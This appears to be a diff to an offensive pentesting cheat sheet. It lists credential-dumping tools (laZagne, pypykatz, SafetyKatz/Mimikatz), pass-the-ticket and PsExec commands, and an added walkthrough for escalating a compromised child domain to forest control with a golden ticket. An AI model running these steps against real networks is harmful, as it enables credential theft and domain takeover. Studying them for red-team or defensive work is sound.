@@ -1131,7 +1131,7 @@ laZagne.exe browsers -firefox
 
 
 
-pypkatz
+pypykatz
 
 ```
 #https://github.com/skelsec/pypykatz
@@ -1148,7 +1148,7 @@ SafetyKatz
 ```powershell
 #https://github.com/GhostPack/SafetyKatz
 
-Full C# Implemenatation of Mimikatz that can be reflectively loaded :D 
+Full C Sharp Implemenatation of Mimikatz that can be reflectively loaded :D 
 
 "SafetyKatz is a combination of slightly modified version of @gentilkiwis Mimikatz project and @subtee's .NET PE Loader.
 
@@ -1259,6 +1259,33 @@ mimikatz # kerberos::ptt <ticket_kirbi_file>
 .\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
 
 .\PsExec.exe -accepteula \\<remote_hostname> cmd
+```
+
+
+
+Child Domain to Forest Compromise
+
+```
+Domain = Logical group of objects (users, computers, servers etc etc) supported from a central location like a DC
+
+Tree = Set of domains using same name space (DNS Name)
+
+Trust = Agreement between 2 domains that allow cross-domain access to resources etc. i/e Michelle@dev.m0chan.com may be able to access resources inside HR.
+
+Forest = Largest Structure composed of all trees.
+
+Most trees are linked with dual sided trust relationships to allow for sharing of resources.
+
+By default the first domain created if the Forest Root.
+
+Let's say we have owned a domain controller and got the KRBTGT Hash (The keys to the castle) we can now create 
+
+Covert-NameToSid target.domain.com\krbtgt
+S-1-5-21-2941561648-383941485-1389968811-502
+
+Replace 502 with 519 to represent Enterprise Admins
+
+Create golden ticket and attack parent domain.
 ```
 
 
